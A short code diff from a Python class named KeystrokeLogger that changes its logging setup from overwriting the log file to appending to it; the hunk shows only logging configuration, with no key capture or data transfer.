@@ -27,7 +27,7 @@ class KeystrokeLogger:
             filename=log_file, 
             level=logging.INFO, 
             format='%(asctime)s - %(message)s',
-            filemode='w'  # Overwrite the file each time
+            filemode='a'  # Append mode to ensure file creation
         )
         self.logger = logging.getLogger(__name__)
         
